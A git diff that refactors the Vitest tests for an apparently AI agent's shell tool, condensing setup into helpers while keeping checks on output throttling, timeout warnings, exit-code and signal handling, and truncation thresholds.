-        expect(updateOutputMock).toHaveBeenCalledTimes(2);
-        expect(updateOutputMock).toHaveBeenLastCalledWith('chunk 4');
+        expectUpdates(2, 'chunk 4');
 
-        resolveExecutionPromise({
-          rawOutput: Buffer.from('chunk 1chunk 2chunk 3chunk 4'),
-          output: 'chunk 1chunk 2chunk 3chunk 4',
-          exitCode: 0,
-          signal: null,
-          error: null,
-          aborted: false,
-          pid: 12345,
-          executionMethod: 'child_process',
-        });
-        await promise;
+        await settle(promise, { output: 'chunk 1chunk 2chunk 3chunk 4' });
       });
 
       it('should cancel a pending trailing flush when the command completes', async () => {
-        // Lifecycle invariant: if the command resolves while a trailing
-        // flush timer is pending, the timer MUST be cancelled. Otherwise
-        // the timer would fire after `execute()` returns and trigger a
-        // phantom updateOutput call against stale `cumulativeOutput`,
-        // racing against the consumer that has already moved on.
-        const invocation = shellTool.build({
-          command: 'quick-cmd',
-          is_background: false,
-        });
-        const promise = invocation.execute(mockAbortSignal, updateOutputMock);
+        // A trailing flush pending at settle MUST be cancelled, or it fires
+        // after `execute()` returns: a phantom updateOutput against stale
+        // `cumulativeOutput`, racing a consumer that has moved on.
+        const promise = start('quick-cmd');
 
-        // Leading-edge update + suppressed chunk (timer pending)
-        mockShellOutputCallback({ type: 'data', chunk: 'first' });
+        emit('first');
         expect(updateOutputMock).toHaveBeenCalledOnce();
-        mockShellOutputCallback({ type: 'data', chunk: 'second' });
+        emit('second');
         expect(updateOutputMock).toHaveBeenCalledOnce();
 
-        // Resolve BEFORE the throttle window elapses. No further chunks.
-        resolveExecutionPromise({
-          rawOutput: Buffer.from('first\nsecond'),
-          output: 'first\nsecond',
-          exitCode: 0,
-          signal: null,
-          error: null,
-          aborted: false,
-          pid: 12345,
-          executionMethod: 'child_process',
-        });
-        await promise;
+        // Resolve BEFORE the throttle window elapses.
+        await settle(promise, { output: 'first\nsecond' });
 
-        // Advancing time past the original window must not produce a
-        // late updateOutput call — the timer was cancelled on settle.
         await vi.advanceTimersByTimeAsync(OUTPUT_UPDATE_INTERVAL_MS * 2);
         expect(updateOutputMock).toHaveBeenCalledOnce();
       });
 
       it('should not fire a duplicate trailing flush after a leading-edge update', async () => {
-        // After a trailing flush emits in window N, the next chunk in
-        // window N+1 takes the leading-edge path. `doUpdate()` is the
-        // single point that cancels any pending trailing-flush timer,
-        // so even if a stale timer were somehow still scheduled when a
-        // leading-edge update fires, no duplicate updateOutput call can
-        // escape. This test asserts the end-to-end invariant: suppress
-        // → trailing flush → leading-edge → suppress → trailing flush
-        // produces exactly the expected sequence with no duplicates.
-        const invocation = shellTool.build({
-          command: 'multi-window-cmd',
-          is_background: false,
-        });
-        const promise = invocation.execute(mockAbortSignal, updateOutputMock);
+        // `doUpdate()` is the single point cancelling a pending trailing flush,
+        // so a leading-edge update never lets a duplicate escape. End-to-end:
+        // suppress → flush → leading edge → suppress → flush, no duplicates.
+        const promise = start('multi-window-cmd');
 
-        // Window 1: leading-edge 'a' at t=0
-        mockShellOutputCallback({ type: 'data', chunk: 'a' });
-        expect(updateOutputMock).toHaveBeenCalledTimes(1);
-        expect(updateOutputMock).toHaveBeenLastCalledWith('a');
-
-        // Window 1: suppressed 'b' schedules trailing flush
+        // Window 1: leading-edge 'a', then 'b' suppressed and flushed.
+        emit('a');
+        expectUpdates(1, 'a');
         await vi.advanceTimersByTimeAsync(100);
-        mockShellOutputCallback({ type: 'data', chunk: 'b' });
+        emit('b');
         expect(updateOutputMock).toHaveBeenCalledTimes(1);
-
-        // Trailing flush fires at the window boundary with 'b'
         await vi.advanceTimersByTimeAsync(OUTPUT_UPDATE_INTERVAL_MS);
-        expect(updateOutputMock).toHaveBeenCalledTimes(2);
-        expect(updateOutputMock).toHaveBeenLastCalledWith('b');
+        expectUpdates(2, 'b');
 
-        // Window 2: advance past the interval, next chunk takes the
-        // leading-edge path. If `doUpdate()` failed to cancel the (now
-        // already-fired) timer, no harm; if doUpdate fails to cancel a
-        // *future* timer scheduled later, we'd see duplicates below.
+        // Window 2: 'c' takes the leading edge; a failure to cancel a future
+        // timer would show up as duplicates below.
         await vi.advanceTimersByTimeAsync(OUTPUT_UPDATE_INTERVAL_MS + 1);
-        mockShellOutputCallback({ type: 'data', chunk: 'c' });
-        expect(updateOutputMock).toHaveBeenCalledTimes(3);
-        expect(updateOutputMock).toHaveBeenLastCalledWith('c');
-
-        // Window 2: suppressed 'd' schedules another trailing flush
+        emit('c');
+        expectUpdates(3, 'c');
         await vi.advanceTimersByTimeAsync(50);
-        mockShellOutputCallback({ type: 'data', chunk: 'd' });
+        emit('d');
         expect(updateOutputMock).toHaveBeenCalledTimes(3);
-
-        // The trailing flush fires exactly once with 'd'.
         await vi.advanceTimersByTimeAsync(OUTPUT_UPDATE_INTERVAL_MS);
-        expect(updateOutputMock).toHaveBeenCalledTimes(4);
-        expect(updateOutputMock).toHaveBeenLastCalledWith('d');
+        expectUpdates(4, 'd');
 
-        // Drain a long quiet period — no spurious late updates from
-        // any zombie timers.
+        // A long quiet period: no late updates from zombie timers.
         await vi.advanceTimersByTimeAsync(OUTPUT_UPDATE_INTERVAL_MS * 5);
         expect(updateOutputMock).toHaveBeenCalledTimes(4);
 
-        resolveExecutionPromise({
-          rawOutput: Buffer.from('abcd'),
-          output: 'abcd',
-          exitCode: 0,
-          signal: null,
-          error: null,
-          aborted: false,
-          pid: 12345,
-          executionMethod: 'child_process',
-        });
-        await promise;
+        await settle(promise, { output: 'abcd' });
       });
 
       it('should cancel a pending trailing flush when the abort signal fires', async () => {
-        // If the user cancels (or the timeout fires) while a trailing
-        // flush is pending, the abort listener must cancel the timer.
-        // Otherwise we'd flash a stale frame between the abort and the
-        // result promise settling with `aborted: true`.
+        // A cancel (or timeout) with a flush pending must cancel the timer,
+        // or a stale frame flashes before the result settles `aborted: true`.
         const ac = new AbortController();
-        const invocation = shellTool.build({
-          command: 'sleep 1',
-          is_background: false,
-        });
-        const promise = invocation.execute(ac.signal, updateOutputMock);
+        const promise = build('sleep 1').execute(ac.signal, updateOutputMock);
 
-        // Leading-edge + suppressed (timer pending)
-        mockShellOutputCallback({ type: 'data', chunk: 'partial' });
+        emit('partial');
         expect(updateOutputMock).toHaveBeenCalledOnce();
-        mockShellOutputCallback({ type: 'data', chunk: 'more partial' });
+        emit('more partial');
         expect(updateOutputMock).toHaveBeenCalledOnce();
 
-        // Abort. The timer must be cancelled synchronously.
+        // Abort cancels the timer synchronously.
         ac.abort();
-
-        // Drain the would-be window. updateOutput must NOT be called.
         await vi.advanceTimersByTimeAsync(OUTPUT_UPDATE_INTERVAL_MS * 2);
         expect(updateOutputMock).toHaveBeenCalledOnce();
 
-        // Settle the execution as aborted so the test cleanly exits.
-        resolveExecutionPromise({
-          rawOutput: Buffer.from('partial'),
+        await settle(promise, {
           output: 'partial',
           exitCode: null,
           signal: 15,
-          error: null,
           aborted: true,
-          pid: 12345,
-          executionMethod: 'child_process',
         });
-        await promise;
 
         // Even after settle + further time, no late update.
         await vi.advanceTimersByTimeAsync(OUTPUT_UPDATE_INTERVAL_MS * 2);
@@ -3123,188 +2516,77 @@ describe('ShellTool', () => {
       });
 
       it('should warn shortly before a foreground command times out', async () => {
-        const setPromoteAbortController = vi.fn();
-        const invocation = shellTool.build({
-          command: 'slow-build',
-          is_background: false,
-          timeout: 20_000,
-        }) as ShellToolInvocation;
-        const promise = invocation.execute(
-          mockAbortSignal,
-          updateOutputMock,
-          undefined,
-          undefined,
-          setPromoteAbortController,
-          () => true,
-        );
-        await Promise.resolve();
-        expect(setPromoteAbortController).toHaveBeenCalledOnce();
+        const { promise } = await startArmed('slow-build');
 
         await vi.advanceTimersByTimeAsync(4_999);
         expect(updateOutputMock).not.toHaveBeenCalled();
 
         await vi.advanceTimersByTimeAsync(1);
         expect(updateOutputMock).toHaveBeenCalledOnce();
-        expect(updateOutputMock).toHaveBeenLastCalledWith(
-          expect.stringContaining('about to time out'),
-        );
-        expect(updateOutputMock).toHaveBeenLastCalledWith(
-          expect.stringContaining('Ctrl+B'),
-        );
+        for (const text of ['about to time out', 'Ctrl+B']) {
+          expect(updateOutputMock).toHaveBeenLastCalledWith(
+            expect.stringContaining(text),
+          );
+        }
 
-        mockShellOutputCallback({ type: 'data', chunk: 'still running' });
+        emit('still running');
         await vi.advanceTimersByTimeAsync(OUTPUT_UPDATE_INTERVAL_MS + 1);
         expect(updateOutputMock).toHaveBeenCalledTimes(2);
-        expect(updateOutputMock).toHaveBeenLastCalledWith(
-          expect.stringContaining('still running'),
-        );
-        expect(updateOutputMock).toHaveBeenLastCalledWith(
-          expect.stringContaining('Ctrl+B'),
-        );
+        for (const text of ['still running', 'Ctrl+B']) {
+          expect(updateOutputMock).toHaveBeenLastCalledWith(
+            expect.stringContaining(text),
+          );
+        }
 
-        resolveExecutionPromise({
-          rawOutput: Buffer.from('still running'),
-          output: 'still running',
-          exitCode: 0,
-          signal: null,
-          error: null,
-          aborted: false,
-          pid: 12345,
-          executionMethod: 'child_process',
-        });
-        await promise;
+        await settle(promise, { output: 'still running' });
       });
 
       it('should append the foreground timeout warning to ANSI output', async () => {
-        const setPromoteAbortController = vi.fn();
-        const invocation = shellTool.build({
-          command: 'ansi-slow-build',
-          is_background: false,
-          timeout: 20_000,
-        }) as ShellToolInvocation;
-        const promise = invocation.execute(
-          mockAbortSignal,
-          updateOutputMock,
-          undefined,
-          undefined,
-          setPromoteAbortController,
-          () => true,
-        );
-        await Promise.resolve();
-        expect(setPromoteAbortController).toHaveBeenCalledOnce();
+        const { promise } = await startArmed('ansi-slow-build');
 
-        const ansiChunk: import('../utils/terminalSerializer.js').AnsiOutput = [
-          [
-            {
-              text: 'still running',
-              bold: false,
-              italic: false,
-              dim: false,
-              underline: false,
-              inverse: false,
-              fg: '',
-              bg: '',
-            },
-          ],
-        ];
-        mockShellOutputCallback({ type: 'data', chunk: ansiChunk });
+        emit(ansiChunk('still running'));
         expect(updateOutputMock).toHaveBeenCalledOnce();
 
         await vi.advanceTimersByTimeAsync(5_000);
 
         expect(updateOutputMock).toHaveBeenCalledTimes(2);
         const warningFrame = updateOutputMock.mock.calls.at(-1)?.[0] as {
-          ansiOutput: import('../utils/terminalSerializer.js').AnsiOutput;
+          ansiOutput: AnsiOutput;
         };
-        const warningToken = warningFrame.ansiOutput.at(-1)?.[0];
-        expect(warningToken).toMatchObject({
+        expect(warningFrame.ansiOutput.at(-1)?.[0]).toMatchObject({
           text: expect.stringContaining('about to time out'),
           bold: true,
           fg: '#ff5555',
         });
 
-        resolveExecutionPromise({
-          rawOutput: Buffer.from('still running'),
-          output: 'still running',
-          exitCode: 0,
-          signal: null,
-          error: null,
-          aborted: false,
-          pid: 12345,
-          executionMethod: 'child_process',
-        });
-        await promise;
+        await settle(promise, { output: 'still running' });
       });
 
       it('should not show the Ctrl+B warning when promotion is ambiguous', async () => {
-        const setPromoteAbortController = vi.fn();
-        const invocation = shellTool.build({
-          command: 'ambiguous-slow-build',
-          is_background: false,
-          timeout: 20_000,
-        }) as ShellToolInvocation;
-        const promise = invocation.execute(
-          mockAbortSignal,
-          updateOutputMock,
-          undefined,
-          undefined,
-          setPromoteAbortController,
+        const { promise } = await startArmed(
+          'ambiguous-slow-build',
           () => false,
         );
-        await Promise.resolve();
-        expect(setPromoteAbortController).toHaveBeenCalledOnce();
 
         await vi.advanceTimersByTimeAsync(5_000);
         expect(updateOutputMock).not.toHaveBeenCalled();
 
-        resolveExecutionPromise({
-          rawOutput: Buffer.from('done'),
-          output: 'done',
-          exitCode: 0,
-          signal: null,
-          error: null,
-          aborted: false,
-          pid: 12345,
-          executionMethod: 'child_process',
-        });
-        await promise;
+        await settle(promise, { output: 'done' });
       });
 
       it('should suppress a stale Ctrl+B warning if promotion becomes ambiguous before the timer fires', async () => {
         let canPromote = true;
-        const setPromoteAbortController = vi.fn();
-        const invocation = shellTool.build({
-          command: 'stale-warning-slow-build',
-          is_background: false,
-          timeout: 20_000,
-        }) as ShellToolInvocation;
-        const promise = invocation.execute(
-          mockAbortSignal,
-          updateOutputMock,
-          undefined,
-          undefined,
-          setPromoteAbortController,
+        const { promise } = await startArmed(
+          'stale-warning-slow-build',
           () => canPromote,
         );
-        await Promise.resolve();
-        expect(setPromoteAbortController).toHaveBeenCalledOnce();
 
         await vi.advanceTimersByTimeAsync(4_999);
         canPromote = false;
         await vi.advanceTimersByTimeAsync(1);
         expect(updateOutputMock).not.toHaveBeenCalled();
 
-        resolveExecutionPromise({
-          rawOutput: Buffer.from('done'),
-          output: 'done',
-          exitCode: 0,
-          signal: null,
-          error: null,
-          aborted: false,
-          pid: 12345,
-          executionMethod: 'child_process',
-        });
-        await promise;
+        await settle(promise, { output: 'done' });
       });
 
       it('schedules the warning against the real timeout clock', async () => {
@@ -3320,23 +2602,7 @@ describe('ShellTool', () => {
             };
           },
         );
-        const setPromoteAbortController = vi.fn();
-        const invocation = shellTool.build({
-          command: 'slow-spawn',
-          is_background: false,
-          timeout: 20_000,
-        }) as ShellToolInvocation;
-
-        const promise = invocation.execute(
-          mockAbortSignal,
-          updateOutputMock,
-          undefined,
-          undefined,
-          setPromoteAbortController,
-          () => true,
-        );
-        await Promise.resolve();
-        expect(setPromoteAbortController).toHaveBeenCalledOnce();
+        const { promise } = await startArmed('slow-spawn');
 
         await vi.advanceTimersByTimeAsync(0);
         expect(updateOutputMock).toHaveBeenCalledOnce();
@@ -3344,108 +2610,36 @@ describe('ShellTool', () => {
           expect.stringContaining('about to time out'),
         );
 
-        resolveExecutionPromise({
-          rawOutput: Buffer.from('done'),
-          output: 'done',
-          exitCode: 0,
-          signal: null,
-          error: null,
-          aborted: false,
-          pid: 12345,
-          executionMethod: 'child_process',
-        });
-        await promise;
+        await settle(promise, { output: 'done' });
       });
 
       it('should not show the Ctrl+B warning outside interactive mode', async () => {
-        const interactiveMock = mockConfig as unknown as {
-          isInteractive: Mock;
-        };
-        interactiveMock.isInteractive.mockReturnValue(false);
-        const invocation = shellTool.build({
-          command: 'headless-build',
-          is_background: false,
-          timeout: 20_000,
-        }) as ShellToolInvocation;
-        const promise = invocation.execute(
-          mockAbortSignal,
-          updateOutputMock,
-          undefined,
-          undefined,
-          vi.fn(),
-          () => true,
-        );
+        (mockConfig.isInteractive as Mock).mockReturnValue(false);
+        const promise = startPromotable('headless-build', vi.fn(), () => true);
         await Promise.resolve();
 
         await vi.advanceTimersByTimeAsync(5_000);
         expect(updateOutputMock).not.toHaveBeenCalled();
 
-        resolveExecutionPromise({
-          rawOutput: Buffer.from('done'),
-          output: 'done',
-          exitCode: 0,
-          signal: null,
-          error: null,
-          aborted: false,
-          pid: 12345,
-          executionMethod: 'child_process',
-        });
-        await promise;
+        await settle(promise, { output: 'done' });
       });
 
       it('should not show the Ctrl+B warning when no promote callback is wired', async () => {
-        const invocation = shellTool.build({
-          command: 'direct-core-build',
-          is_background: false,
-          timeout: 20_000,
-        });
-        const promise = invocation.execute(mockAbortSignal, updateOutputMock);
+        const promise = start('direct-core-build', { timeout: 20_000 });
         await Promise.resolve();
 
         await vi.advanceTimersByTimeAsync(5_000);
         expect(updateOutputMock).not.toHaveBeenCalled();
 
-        resolveExecutionPromise({
-          rawOutput: Buffer.from('done'),
-          output: 'done',
-          exitCode: 0,
-          signal: null,
-          error: null,
-          aborted: false,
-          pid: 12345,
-          executionMethod: 'child_process',
-        });
-        await promise;
+        await settle(promise, { output: 'done' });
       });
 
       it('should cancel the near-timeout warning when the command completes early', async () => {
-        const invocation = shellTool.build({
-          command: 'quick-cmd',
-          is_background: false,
-          timeout: 20_000,
-        }) as ShellToolInvocation;
-        const promise = invocation.execute(
-          mockAbortSignal,
-          updateOutputMock,
-          undefined,
-          undefined,
-          vi.fn(),
-          () => true,
-        );
+        const promise = startPromotable('quick-cmd', vi.fn(), () => true);
         await Promise.resolve();
 
         await vi.advanceTimersByTimeAsync(1_000);
-        resolveExecutionPromise({
-          rawOutput: Buffer.from('done'),
-          output: 'done',
-          exitCode: 0,
-          signal: null,
-          error: null,
-          aborted: false,
-          pid: 12345,
-          executionMethod: 'child_process',
-        });
-        await promise;
+        await settle(promise, { output: 'done' });
 
         await vi.advanceTimersByTimeAsync(10_000);
         expect(updateOutputMock).not.toHaveBeenCalled();
@@ -3466,18 +2660,11 @@ describe('ShellTool', () => {
             });
           },
         );
-        const invocation = shellTool.build({
-          command: 'slow-spawn',
-          is_background: false,
-          timeout: 20_000,
-        }) as ShellToolInvocation;
-        const promise = invocation.execute(
-          ac.signal,
-          updateOutputMock,
-          undefined,
-          undefined,
+        const promise = startPromotable(
+          'slow-spawn',
           setPromoteAbortController,
           () => true,
+          ac.signal,
         );
 
         ac.abort();
@@ -3494,103 +2681,46 @@ describe('ShellTool', () => {
         await vi.advanceTimersByTimeAsync(5_000);
         expect(updateOutputMock).not.toHaveBeenCalled();
 
-        resolveExecutionPromise({
-          rawOutput: Buffer.from('partial'),
+        await settle(promise, {
           output: 'partial',
           exitCode: null,
           signal: 15,
-          error: null,
           aborted: true,
-          pid: 12345,
-          executionMethod: 'child_process',
         });
-        await promise;
       });
 
       it('should clean up a pending trailing flush if execute() rejects', async () => {
-        // ShellExecutionService.execute() can throw before resolving
-        // (e.g. PTY dynamic import failure). The tool must propagate the
-        // error AND ensure no scheduled timer survives to fire a late
-        // updateOutput call after the caller has already seen the error.
-        // No chunks can arrive before execute() resolves, and the
-        // near-timeout warning is not armed until a foreground handle exists.
+        // The service can throw before resolving (e.g. PTY dynamic import
+        // failure): the error propagates and no timer survives to fire a late
+        // update (no chunk or near-timeout warning can precede the handle).
         const ac = new AbortController();
         mockShellExecutionService.mockImplementationOnce(() => {
           throw new Error('pty-import-failed');
         });
 
-        const invocation = shellTool.build({
-          command: 'pty-cmd',
-          is_background: false,
-          timeout: 20_000,
-        });
-
         await expect(
-          invocation.execute(ac.signal, updateOutputMock),
+          build('pty-cmd', { timeout: 20_000 }).execute(
+            ac.signal,
+            updateOutputMock,
+          ),
         ).rejects.toThrow('pty-import-failed');
 
-        // After rejection, aborting must not crash and must not produce
-        // any updateOutput calls (no listener leak).
+        // Aborting afterwards must not crash or update (no listener leak).
         ac.abort();
         await vi.advanceTimersByTimeAsync(5_000);
         expect(updateOutputMock).not.toHaveBeenCalled();
       });
 
       it('should pass ANSI chunks through immediately without throttling', async () => {
-        const invocation = shellTool.build({
-          command: 'interactive-cmd',
-          is_background: false,
-        });
-        const promise = invocation.execute(mockAbortSignal, updateOutputMock);
+        const promise = start('interactive-cmd');
 
-        const ansiChunk1: import('../utils/terminalSerializer.js').AnsiOutput =
-          [
-            [
-              {
-                text: 'Hello',
-                bold: false,
-                italic: false,
-                dim: false,
-                underline: false,
-                inverse: false,
-                fg: '',
-                bg: '',
-              },
-            ],
-          ];
-        const ansiChunk2: import('../utils/terminalSerializer.js').AnsiOutput =
-          [
-            [
-              {
-                text: 'World',
-                bold: false,
-                italic: false,
-                dim: false,
-                underline: false,
-                inverse: false,
-                fg: '',
-                bg: '',
-              },
-            ],
-          ];
-
-        // Both ANSI chunks should fire updateOutput immediately, back-to-back
-        mockShellOutputCallback({ type: 'data', chunk: ansiChunk1 });
-        mockShellOutputCallback({ type: 'data', chunk: ansiChunk2 });
+        // Both ANSI chunks fire updateOutput immediately, back-to-back.
+        emit(ansiChunk('Hello'));
+        emit(ansiChunk('World'));
 
         expect(updateOutputMock).toHaveBeenCalledTimes(2);
 
-        resolveExecutionPromise({
-          rawOutput: Buffer.from(''),
-          output: '',
-          exitCode: 0,
-          signal: null,
-          error: null,
-          aborted: false,
-          pid: 12345,
-          executionMethod: 'child_process',
-        });
-        await promise;
+        await settle(promise);
       });
     });
 
@@ -3598,12 +2728,9 @@ describe('ShellTool', () => {
       'omits repeated command source from nested shell results (exit %i)',
       async (exitCode) => {
         const command = 'echo ' + 'large-script-source'.repeat(3000);
-        const invocation = shellTool.build({ command, is_background: false });
-        const promise = runWithToolCallSource(
-          {
-            kind: 'code_mode',
-          },
-          () => invocation.execute(mockAbortSignal),
+        const invocation = build(command);
+        const promise = runWithToolCallSource({ kind: 'code_mode' }, () =>
+          invocation.execute(mockAbortSignal),
         );
         resolveShellExecution({
           output: 'diagnostic output',
@@ -3611,123 +2738,111 @@ describe('ShellTool', () => {
           error: null,
         });
         const result = await promise;
-        expect(result.llmContent).toContain('diagnostic output');
-        expect(result.llmContent).toContain(`Exit Code: ${exitCode}`);
-        expect(result.llmContent).not.toContain('large-script-source');
+        expectText(
+          result.llmContent,
+          ['diagnostic output', `Exit Code: ${exitCode}`],
+          ['large-script-source'],
+        );
         expect(String(result.llmContent).length).toBeLessThan(1000);
         if (exitCode !== 0) {
-          expect(result.error?.message).toContain('diagnostic output');
-          expect(result.error?.message).not.toContain('large-script-source');
+          expectText(
+            result.error?.message,
+            ['diagnostic output'],
+            ['large-script-source'],
+          );
         }
       },
     );
 
-    it('reports a foreground non-zero exit as a tool error', async () => {
-      const invocation = shellTool.build({
-        command: 'failing-command',
-        is_background: false,
-      });
-      const promise = invocation.execute(mockAbortSignal);
-      resolveShellExecution({
-        output: 'failed output',
-        exitCode: 3,
-        error: null,
-      });
+    it.each(['failed output', ''])(
+      'reports a foreground non-zero exit with output %j as a tool error',
+      async (output) => {
+        const result = await runFg('failing-command', { output, exitCode: 3 });
 
-      const result = await promise;
+        expect(shellResultText(result.returnDisplay)).toBe(
+          output || 'Command exited with code: 3',
+        );
+        expect(result.error).toEqual({
+          message: expect.stringContaining('Exit Code: 3'),
+          type: ToolErrorType.SHELL_EXECUTE_ERROR,
+        });
+        expect(result.error?.message).toContain(output || 'Output: (empty)');
+        expect(result.returnDisplay).toMatchObject({
+          type: 'shell_result',
+          version: 1,
+          outcome: 'failed',
+          output,
+          exitCode: 3,
+        });
+      },
+    );
 
-      expect(result.returnDisplay).toContain('failed output');
-      expect(result.error).toEqual({
-        message: expect.stringContaining('Exit Code: 3'),
-        type: ToolErrorType.SHELL_EXECUTE_ERROR,
-      });
-      expect(result.error?.message).toContain('failed output');
-    });
+    /** A foreground run killed by SIGTERM (numeric code 15), not by us. */
+    const SIGTERMED = { output: '', exitCode: null, signal: 15 };
+    /** The tool error a signal-terminated foreground run reports. */
+    const SIGNAL_15_ERROR = {
+      message: expect.stringContaining('Signal: 15'),
+      type: ToolErrorType.SHELL_EXECUTE_ERROR,
+    };
 
     it('reports a foreground signal termination as a tool error', async () => {
-      const invocation = shellTool.build({
-        command: 'signal-terminated-command',
-        is_background: false,
-      });
-      const promise = invocation.execute(mockAbortSignal);
-      resolveShellExecution({
-        output: '',
-        exitCode: null,
-        signal: 15,
-        error: null,
-        aborted: false,
-      });
+      const result = await runFg('signal-terminated-command', SIGTERMED);
 
-      const result = await promise;
-
-      expect(result.error).toEqual({
-        message: expect.stringContaining('Signal: 15'),
-        type: ToolErrorType.SHELL_EXECUTE_ERROR,
-      });
-      expect(result.returnDisplay).toContain(
+      expect(result.error).toEqual(SIGNAL_15_ERROR);
+      expect(shellResultText(result.returnDisplay)).toBe(
         'Command terminated by signal: 15',
       );
     });
 
     it('keeps a successful PTY exit code successful with signal 0 metadata', async () => {
-      const invocation = shellTool.build({
-        command: 'pty-cleanup-command',
-        is_background: false,
-      });
-      const promise = invocation.execute(mockAbortSignal);
-      resolveShellExecution({
+      const result = await runFg('pty-cleanup-command', {
         output: 'completed',
         exitCode: 0,
         signal: 0,
-        aborted: false,
       });
-
-      const result = await promise;
 
       expect(result.error).toBeUndefined();
       expect(result.llmContent).toContain('Output: completed');
+      expect(result.returnDisplay).toEqual({
+        type: 'shell_result',
+        version: 1,
+        text: 'completed',
+        output: 'completed',
+        directory: '/test/dir',
+        exitCode: 0,
+        signal: 0,
+        pid: 12345,
+        error: null,
+        outcome: 'completed',
+        notices: [],
+        truncated: false,
+        outputFiles: [],
+      });
     });
 
     it('reports a PTY signal termination as a tool error', async () => {
-      const invocation = shellTool.build({
-        command: 'pty-signal-terminated-command',
-        is_background: false,
-      });
-      const promise = invocation.execute(mockAbortSignal);
-      resolveShellExecution({
+      const result = await runFg('pty-signal-terminated-command', {
         output: '',
         exitCode: 0,
         signal: 15,
-        error: null,
-        aborted: false,
       });
 
-      const result = await promise;
-
-      expect(result.error).toEqual({
-        message: expect.stringContaining('Signal: 15'),
-        type: ToolErrorType.SHELL_EXECUTE_ERROR,
-      });
+      expect(result.error).toEqual(SIGNAL_15_ERROR);
     });
 
     it('does not report a user-cancelled signal as a tool error', async () => {
-      const invocation = shellTool.build({
-        command: 'cancelled-command',
-        is_background: false,
-      });
-      const promise = invocation.execute(mockAbortSignal);
-      resolveShellExecution({
-        output: '',
-        exitCode: null,
-        signal: 15,
-        error: null,
+      const result = await runFg('cancelled-command', {
+        ...SIGTERMED,
         aborted: true,
       });
 
-      const result = await promise;
-
       expect(result.error).toBeUndefined();
       expect(result.llmContent).toContain('Command was cancelled');
+      expect(result.returnDisplay).toMatchObject({
+        outcome: 'cancelled',
+        output: '',
+        signal: 15,
+      });
     });
 
     it.each([
@@ -3739,93 +2854,69 @@ describe('ShellTool', () => {
       '[[ -f missing ]]',
       '"C:\\\\tools\\\\grep.exe" pattern file',
     ])('does not report exit 1 from %s as a tool error', async (command) => {
-      const invocation = shellTool.build({
-        command,
-        is_background: false,
-      });
-      const promise = invocation.execute(mockAbortSignal);
-      resolveShellExecution({
+      const result = await runFg(command, {
         output: 'negative result',
         exitCode: 1,
-        error: null,
       });
-
-      const result = await promise;
 
       expect(result.error).toBeUndefined();
       expect(result.llmContent).toContain('Exit Code: 1');
+      expect(result.returnDisplay).toMatchObject({
+        outcome: 'completed',
+        exitCode: 1,
+        error: null,
+      });
     });
 
     it('does not report exit 1 from a pipeline ending in grep as a tool error', async () => {
-      const invocation = shellTool.build({
-        command: 'ps aux | grep missing-process',
-        is_background: false,
-      });
-      const promise = invocation.execute(mockAbortSignal);
-      resolveShellExecution({
+      const result = await runFg('ps aux | grep missing-process', {
         output: '',
         exitCode: 1,
-        error: null,
       });
-
-      const result = await promise;
 
       expect(result.error).toBeUndefined();
       expect(result.llmContent).toContain('Exit Code: 1');
     });
 
-    it('reports exit 1 from find as a tool error', async () => {
-      const invocation = shellTool.build({
-        command: 'find missing-directory',
-        is_background: false,
-      });
-      const promise = invocation.execute(mockAbortSignal);
-      resolveShellExecution({
-        output: 'find: missing-directory: No such file or directory',
-        exitCode: 1,
-        error: null,
-      });
-
-      const result = await promise;
-
-      expect(result.error?.type).toBe(ToolErrorType.SHELL_EXECUTE_ERROR);
-    });
-
-    it('does not exempt exit 1 from a mixed compound command', async () => {
-      const invocation = shellTool.build({
-        command: 'false && ps aux | grep pattern',
-        is_background: false,
-      });
-      const promise = invocation.execute(mockAbortSignal);
-      resolveShellExecution({
-        output: '',
-        exitCode: 1,
-        error: null,
-      });
-
-      const result = await promise;
-
-      expect(result.error?.type).toBe(ToolErrorType.SHELL_EXECUTE_ERROR);
-    });
-
-    it('reports exit 2 from an allowlisted command as a tool error', async () => {
-      const invocation = shellTool.build({
-        command: 'grep pattern file',
-        is_background: false,
-      });
-      const promise = invocation.execute(mockAbortSignal);
-      resolveShellExecution({
-        output: 'grep failed',
-        exitCode: 2,
-        error: null,
-      });
-
-      const result = await promise;
+    it.each([
+      [
+        'reports exit 1 from find as a tool error',
+        'find missing-directory',
+        'find: missing-directory: No such file or directory',
+        1,
+      ],
+      [
+        'does not exempt exit 1 from a mixed compound command',
+        'false && ps aux | grep pattern',
+        '',
+        1,
+      ],
+      [
+        'reports exit 2 from an allowlisted command as a tool error',
+        'grep pattern file',
+        'grep failed',
+        2,
+      ],
+    ])('%s', async (_title, command, output, exitCode) => {
+      const result = await runFg(command, { output, exitCode });
 
       expect(result.error?.type).toBe(ToolErrorType.SHELL_EXECUTE_ERROR);
     });
 
     describe('output truncation threshold', () => {
+      const TRUNCATED = 'Tool output was too large and has been truncated';
+      const ADVISORY = 'this foreground command ran for 60s';
+
+      /** Runs `mid-output-cmd` to `output`/`exitCode` after 60s of faked Date/performance (so the advisory appends). */
+      const runPastAdvisory = (output: string, exitCode = 0) => {
+        fakeTimers({ toFake: ['Date', 'performance'] });
+        return runFg(
+          'mid-output-cmd',
+          { output, exitCode },
+          { advanceMs: 60_000 },
+        );
+      };
+
       it('keeps the 30k Shell default when no threshold is configured', () => {
         expect(shellTool.maxOutputChars).toBe(30_000);
       });
@@ -3833,167 +2924,136 @@ describe('ShellTool', () => {
       it.each([25_000, 10_000, 100_000, Number.POSITIVE_INFINITY])(
         'exposes the explicit threshold %s to the scheduler',
         (threshold) => {
-          (
-            mockConfig.isTruncateToolOutputThresholdExplicit as Mock
-          ).mockReturnValue(true);
-          (mockConfig.getTruncateToolOutputThreshold as Mock).mockReturnValue(
-            threshold,
-          );
+          setExplicitThreshold(threshold);
 
           expect(shellTool.maxOutputChars).toBe(threshold);
         },
       );
 
       it('passes the 30k Shell default to output truncation', async () => {
-        const truncationModule = await import('./truncation.js');
-        const spy = vi
-          .spyOn(truncationModule, 'truncateToolOutput')
-          .mockImplementation(async (_config, _toolName, content) => ({
-            content,
-          }));
+        const spy = await spyTruncation();
 
-        try {
-          const invocation = shellTool.build({
-            command: 'large-output-cmd',
-            is_background: false,
-          });
-          const promise = invocation.execute(mockAbortSignal);
-          resolveShellExecution({ output: 'x'.repeat(35_000), exitCode: 0 });
+        await runFg('large-output-cmd', { output: 'x'.repeat(35_000) });
 
-          await promise;
-
-          expect(spy).toHaveBeenCalledWith(
-            mockConfig,
-            ShellTool.Name,
-            expect.any(String),
-            expect.objectContaining({ threshold: 30_000 }),
-          );
-        } finally {
-          spy.mockRestore();
-        }
+        expect(spy).toHaveBeenCalledWith(
+          mockConfig,
+          ShellTool.Name,
+          expect.any(String),
